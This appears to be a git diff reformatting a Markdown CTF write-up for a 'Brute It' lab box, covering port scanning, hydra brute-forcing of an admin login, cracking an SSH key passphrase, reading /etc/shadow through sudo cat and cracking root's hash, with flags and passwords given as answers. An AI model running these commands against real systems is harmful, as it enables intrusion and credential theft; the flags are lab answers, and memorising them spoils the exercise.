@@ -12,7 +12,8 @@ pagination_prev: null
 
 ## Task 2: Reconnaissance
 ### Search for open ports using nmap. How many ports are open?
-- Let's perform a `nmap` scan against the machine.
+
+Let's perform a `nmap` scan against the machine.
 ```
 $ nmap -sC -sV 10.10.30.186
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-07 08:43 IST
@@ -33,7 +34,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
 ```
-- As we can see there are two open ports:
+As we can see there are two open ports:
 
 | Port | Service  |
 |--|--|
@@ -47,7 +48,7 @@ Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
 &nbsp;
 
 ### What version of SSH is running?
-- The answer is present in the `nmap` scan,
+The answer is present in the `nmap` scan,
 ### Answer
 ```
 OpenSSH 7.6p1
@@ -56,7 +57,7 @@ OpenSSH 7.6p1
 &nbsp;
 
 ### What version of Apache is running?
-- The answer is in the `nmap` scan.
+The answer is in the `nmap` scan.
 ### Answer
 ```
 2.4.29
@@ -66,7 +67,7 @@ OpenSSH 7.6p1
 
 ### Which Linux distribution is running?
 
-- The answer is in the `nmap` scan.
+The answer is in the `nmap` scan.
 ### Answer
 ```
 Ubuntu
@@ -75,7 +76,7 @@ Ubuntu
 &nbsp;
 
 ### Search for hidden directories on web server. What is the hidden directory?
-- Let's brute force the web pages using `gobuster`.
+Let's brute force the web pages using `gobuster`.
 ```
 $ gobuster dir -u http://10.10.30.186 -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
@@ -113,15 +114,15 @@ Finished
 ## Task 2: Getting a shell
 ### What is the user:password of the admin panel?
 
-- Let's go to the `admin/` directory.
+Let's go to the `admin/` directory.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/37b68183-6329-49a4-9acf-f8aaed6cb39b)
 
-- We can check the source code using  `CTRL+U`.
+We can check the source code using  `CTRL+U`.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/c99d5669-21ec-4307-8060-88d15e86109d)
 
-- Now that we know the username, we can use `hydra` to brute force the password.
+Now that we know the username, we can use `hydra` to brute force the password.
 ```
 $ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.30.186 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=username or password invalid"
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -140,12 +141,12 @@ admin:xavier
 
 &nbsp;
 
-##$ Crack the RSA key you found. What is John's RSA Private Key passphrase?
-- Let's login with `admin` as the username and `xavier` as the password.
+### Crack the RSA key you found. What is John's RSA Private Key passphrase?
+Let's login with `admin` as the username and `xavier` as the password.
 
 ![4](https://github.com/Knign/Write-ups/assets/110326359/8926dd22-3fbc-45c3-8f40-29f627bc8c2a)
 
-- Let's download the `RSA private key`. for the user `john`.
+Let's download the `RSA private key`. for the user `john`.
 ```
 $ wget http://10.10.30.186/admin/panel/id_rsa
 --2023-12-07 09:59:03--  http://10.10.30.186/admin/panel/id_rsa
@@ -158,11 +159,11 @@ id_rsa                                                     100%[================
 
 2023-12-07 09:59:04 (3.21 No error) - ‘id_rsa’ saved [1766/1766]
 ```
-- We can use `ssh2john` to create a hash file.
+We can use `ssh2john` to create a hash file.
 ```
 $ ssh2john id_rsa > id_hash 
 ```
-- Now we can use `john` to crack the hashes.
+Now we can use `john` to crack the hashes.
 ```
 $ john id_hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -184,11 +185,11 @@ rockinroll
 &nbsp;
 
 ### user.txt
-- Let's change the permissions of the `id_rsa` file.
+Let's change the permissions of the `id_rsa` file.
 ```
 $ chmod 700 id_rsa 
 ```
-- Now that we know that the password for `john` is `rockinroll`, let's login through SSH.
+Now that we know that the password for `john` is `rockinroll`, let's login through SSH.
 ```
 $ ssh -i id_rsa john@10.10.30.186
 Enter passphrase for key 'id_rsa': 
@@ -213,7 +214,7 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
 john@bruteit:~$ 
 ```
-- Let's read the `user.txt` file.
+Let's read the `user.txt` file.
 ```
 john@bruteit:~$ ls
 user.txt
@@ -226,7 +227,7 @@ THM{a_password_is_not_a_barrier}
 ```
 
 ### Web flag
-- The web flag was present on the page with the RSA private key.
+The web flag was present on the page with the RSA private key.
 ### Answer
 ```
 THM{brut3_f0rce_is_e4sy}
@@ -236,7 +237,7 @@ THM{brut3_f0rce_is_e4sy}
 
 ## Task 4: Privilege Escalation
 ### Find a form to escalate your privileges. What is the root's password?
-- Let's check what files `john` has the permission to execute.
+Let's check what files `john` has the permission to execute.
 ```
 john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
@@ -245,8 +246,9 @@ Matching Defaults entries for john on bruteit:
 User john may run the following commands on bruteit:
     (root) NOPASSWD: /bin/cat
 ```
-- So we can run `/bin/cat` as an elevated user. 
-- That means we can cat the `/etc/shadow` file.
+So we can run `/bin/cat` as an elevated user. 
+
+That means we can cat the `/etc/shadow` file.
 ```
 john@bruteit:~$ sudo /bin/cat /etc/shadow
 root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
@@ -281,16 +283,16 @@ thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfc
 sshd:*:18489:0:99999:7:::
 john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
 ```
-- We can tell that the `root` user's password is hashed using SHA-512 by the `$6$` characters.
-- Let's save the `root` user's hash on our machine.
+We can tell that the `root` user's password is hashed using SHA-512 by the `$6$` characters.
+Let's save the `root` user's hash on our machine.
 ```
 $ echo $6$zdk0jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6MJYPUTAaWu4infDjI88U9yUXEVgL > root_hash
 ```
-- We have to find the correct for SHA-512.
+We have to find the correct for SHA-512.
 
 ![5](https://github.com/Knign/Write-ups/assets/110326359/d9c4b88b-0258-47b3-b00a-3bf9bcbd6e60)
 
-- Let's run `hashcat` in order to crack this hash.
+Let's run `hashcat` in order to crack this hash.
 ```
 $ hashcat -a 0 -m 1800 root_hash.txt /usr/share/wordlists/rockyou.txt
 ```
@@ -302,13 +304,13 @@ football
 &nbsp;
 
 ### root.txt
-- Let's switch to the `root` user.
+Let's switch to the `root` user.
 ```
 john@bruteit:~$ su root
 Password: 
 root@bruteit:/home/john# 
 ```
-- We can now read the `root.txt` file.
+We can now read the `root.txt` file.
 ```
 root@bruteit:/home/john# cd /root
 root@bruteit:~# cat root.txt
@@ -318,4 +320,3 @@ THM{pr1v1l3g3_3sc4l4t10n}
 ```
 THM{pr1v1l3g3_3sc4l4t10n}
 ```
-
